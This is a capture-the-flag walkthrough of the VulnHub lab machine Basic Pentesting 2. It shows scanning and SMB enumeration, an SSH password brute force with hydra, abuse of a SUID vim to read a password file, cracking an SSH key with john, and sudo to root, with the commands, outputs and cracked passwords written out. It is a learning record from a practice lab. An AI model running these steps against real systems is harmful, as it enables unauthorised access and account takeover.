IP: 10.0.2.5

rustcan:

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
8009/tcp open  ajp13        syn-ack ttl 64
8080/tcp open  http-proxy   syn-ack ttl 64
MAC Address: 08:00:27:05:6C:5D (Oracle VirtualBox virtual NIC)


Nmap:

PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack ttl 64 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        syn-ack ttl 64 Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:05:6C:5D (Oracle VirtualBox virtual NIC)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-05-28T15:13:06
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5869/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51706/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 62543/udp): CLEAN (Failed to receive data)
|   Check 4 (port 55284/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-05-28T11:13:06-04:00




dirb on port 80:

dirb http://10.0.2.5 /usr/share/wordlists/dirb/common.txt   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 28 11:14:28 2025
URL_BASE: http://10.0.2.5/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.5/ ----
==> DIRECTORY: http://10.0.2.5/development/                                                                                                                                                 
+ http://10.0.2.5/index.html (CODE:200|SIZE:158)                                                                                                                                            
+ http://10.0.2.5/server-status (CODE:403|SIZE:296)                                                                                                                                         
                                                                                                                                                                                            
---- Entering directory: http://10.0.2.5/development/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed May 28 11:14:30 2025
DOWNLOADED: 4612 - FOUND: 2


visiting /development there are 2 files:


first one named dev.txt:

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J


and the second one named j.txt

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K


dirb on 8080:
irb http://10.0.2.5:8080 /usr/share/wordlists/dirb/common.txt  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 28 11:17:00 2025
URL_BASE: http://10.0.2.5:8080/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.5:8080/ ----
+ http://10.0.2.5:8080/docs (CODE:302|SIZE:0)                                                                                                                                               
+ http://10.0.2.5:8080/examples (CODE:302|SIZE:0)                                                                                                                                           
+ http://10.0.2.5:8080/favicon.ico (CODE:200|SIZE:21630)                                                                                                                                    
+ http://10.0.2.5:8080/host-manager (CODE:302|SIZE:0)                                                                                                                                       
+ http://10.0.2.5:8080/manager (CODE:302|SIZE:0)                                                                                                                                            
                                                                                                                                                                                            
-----------------
END_TIME: Wed May 28 11:17:04 2025
DOWNLOADED: 4612 - FOUND: 5



enumerating SAMBA:

mbclient -L 10.0.2.5 -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2


smbclient //10.0.2.5/Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11079296 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (18.8 KiloBytes/sec) (average 18.8 KiloBytes/sec)

contents of staff.txt:

cat staff.txt                                          
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay



We now have 2 users: Jan and Kay


we can confirm this with enum4linux:

enum4linux  10.0.2.5
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 28 11:36:56 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                             
Target ........... 10.0.2.5                                                                                                                                                                  
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==============================( Enumerating Workgroup/Domain on 10.0.2.5 )==============================
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                     
                                                                                                                                                                                             
                                                                                                                                                                                             
 ==================================( Nbtstat Information for 10.0.2.5 )==================================
                                                                                                                                                                                             
Looking up status of 10.0.2.5                                                                                                                                                                
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 =====================================( Session Check on 10.0.2.5 )=====================================
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Server 10.0.2.5 allows sessions using username '', password ''                                                                                                                           
                                                                                                                                                                                             
                                                                                                                                                                                             
 ==================================( Getting domain SID for 10.0.2.5 )==================================
                                                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
 =====================================( OS information on 10.0.2.5 )=====================================
                                                                                                                                                                                             
                                                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Got OS info for 10.0.2.5 from srvinfo:                                                                                                                                                   
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu                                                                                                                       
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =========================================( Users on 10.0.2.5 )=========================================
                                                                                                                                                                                             
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                      
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ===================================( Share Enumeration on 10.0.2.5 )===================================
                                                                                                                                                                                             
                                                                                                                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on 10.0.2.5                                                                                                                                                     
                                                                                                                                                                                             
//10.0.2.5/Anonymous    Mapping: OK Listing: OK Writing: N/A                                                                                                                                 

[E] Can't understand response:                                                                                                                                                               
                                                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                   
//10.0.2.5/IPC$ Mapping: N/A Listing: N/A Writing: N/A

 ==============================( Password Policy Information for 10.0.2.5 )==============================
                                                                                                                                                                                             
                                                                                                                                                                                             

[+] Attaching to 10.0.2.5 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                                                
Minimum Password Length: 5


 =========================================( Groups on 10.0.2.5 )=========================================
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                                                  
                                                                                                                                                                                             
                                                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                                                      
                                                                                                                                                                                             
                                                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                                                   
                                                                                                                                                                                             
                                                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                                                        
                                                                                                                                                                                             
                                                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                                                  
                                                                                                                                                                                             
                                                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                                                       
                                                                                                                                                                                             
                                                                                                                                                                                             
 ====================( Users on 10.0.2.5 via RID cycling (RIDS: 500-550,1000-1050) )====================
                                                                                                                                                                                             
                                                                                                                                                                                             
[I] Found new SID:                                                                                                                                                                           
S-1-22-1                                                                                                                                                                                     

[I] Found new SID:                                                                                                                                                                           
S-1-5-32                                                                                                                                                                                     

[I] Found new SID:                                                                                                                                                                           
S-1-5-32                                                                                                                                                                                     

[I] Found new SID:                                                                                                                                                                           
S-1-5-32                                                                                                                                                                                     

[I] Found new SID:                                                                                                                                                                           
S-1-5-32                                                                                                                                                                                     

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''                                                                                 
                                                                                                                                                                                             
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)                                                                                                                     
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                  
                                                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                  
                                                                                                                                                                                             
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                                                     
S-1-22-1-1001 Unix User\jan (Local User)

 =================================( Getting printer info for 10.0.2.5 )=================================
                                                                                                                                                                                             
No printers returned.                                                                                                                                                                        


enum4linux complete on Wed May 28 11:37:12 2025




Knowing the the pass of jan user is not strong, we can attempt to crack it using hydra
hydra -l jan -P /usr/share/wordlists/rockyou.txt -V ssh://10.0.2.5

[22][ssh] host: 10.0.2.5   login: jan   password: armando

now we can ssh to it:

ssh jan@10.0.2.5

jan@basic2:~$ pwd
/home/jan


PRIVESC:
jan@basic2:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping


we can try to use vim.basic to read the pass of kay

vim pass.bak

heresareallystrongpasswordthatfollowsthepasswordpolicy$$

we can now switch to kay:

jan@basic2:/home/kay$ su kay
Password: 
kay@basic2:~$ id
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
kay@basic2:~$ 

kay@basic2:~$ sudo su
[sudo] password for kay: 
Sorry, try again.
[sudo] password for kay: 
Sorry, try again.
[sudo] password for kay: 
root@basic2:/home/kay# cd root
bash: cd: root: No such file or directory
root@basic2:/home/kay# cd ..
root@basic2:/home# pwd
/home
root@basic2:/home# cd ..
root@basic2:/# cd root
root@basic2:~# ls
flag.txt
root@basic2:~# cat flag.txt
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
root@basic2:~# 



PRIVESC #2:


get the id_rsa of kay user

then use ssh2john to convert it to a hash

ssh2john key.txt > key.hash


then use john to crack the hash:

ohn key.hash /usr/share/wordlists/rockyou.txt 
Warning: only loading hashes of type "SSH", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "pix-md5"
Use the "--format=pix-md5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mysql"
Use the "--format=mysql" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "oracle"
Use the "--format=oracle" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1"
Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "LM"
Use the "--format=LM" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "bfegg"
Use the "--format=bfegg" option to force loading hashes of that type instead
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "SSH", but also saw type "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "cryptoSafe"
Use the "--format=cryptoSafe" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Tiger"
Use the "--format=Tiger" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "lotus5"
Use the "--format=lotus5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA224"
Use the "--format=HMAC-SHA224" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "MD2"
Use the "--format=MD2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mdc2"
Use the "--format=mdc2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mscash"
Use the "--format=mscash" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mscash2"
Use the "--format=mscash2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA224"
Use the "--format=Raw-SHA224" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Palshop"
Use the "--format=Palshop" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "NT"
Use the "--format=NT" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ripemd-160"
Use the "--format=ripemd-160" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD4"
Use the "--format=Raw-MD4" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5"
Use the "--format=Raw-MD5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "hMailServer"
Use the "--format=hMailServer" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5u"
Use the "--format=Raw-MD5u" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ripemd-128"
Use the "--format=ripemd-128" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "gost"
Use the "--format=gost" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Snefru-128"
Use the "--format=Snefru-128" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ZipMonster"
Use the "--format=ZipMonster" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA384"
Use the "--format=HMAC-SHA384" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "oracle11"
Use the "--format=oracle11" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "xsha"
Use the "--format=xsha" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "lotus85"
Use the "--format=lotus85" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "plaintext"
Use the "--format=plaintext" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
0g 0:00:01:25  3/3 0g/s 2603Kp/s 2603Kc/s 2603KC/s malkr2g..malveen
0g 0:00:01:41  3/3 0g/s 2401Kp/s 2401Kc/s 2401KC/s 094048250..094048244
0g 0:00:04:37  3/3 0g/s 978003p/s 978003c/s 978003C/s cory2n..cory5^
0g 0:00:05:37  3/3 0g/s 1413Kp/s 1413Kc/s 1413KC/s 0876543456..0876543430
0g 0:00:09:50  3/3 0g/s 2226Kp/s 2226Kc/s 2226KC/s gibjtwi..gib02gj
0g 0:00:12:40  3/3 0g/s 2171Kp/s 2171Kc/s 2171KC/s mypeposel1..mypeposere
0g 0:00:15:32  3/3 0g/s 2026Kp/s 2026Kc/s 2026KC/s enzky#3..enzkyun
beeswax          (key.txt)     
1g 0:00:15:54 DONE 3/3 (2025-05-29 07:57) 0.001047g/s 2032Kp/s 2032Kc/s 2032KC/s beeswat..beeswin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



Then we can add the correct permissions and then ssh to kay user:

──(gabi㉿kali)-[~/Documents/Vulnhub/BasicPentest2]
└─$ chmod 600 key.txt
                                                                                                                                                                                             
┌──(gabi㉿kali)-[~/Documents/Vulnhub/BasicPentest2]
└─$ ssh -i key.txt kay@10.0.2.5
Enter passphrase for key 'key.txt': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

286 packages can be updated.
200 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ 

then we can simply read the password and switch to root user:

kay@basic2:~$ pwd
/home/kay
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ sudo -l
[sudo] password for kay: 
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
kay@basic2:~$ 


kay@basic2:~$ sudo su
root@basic2:/home/kay# 



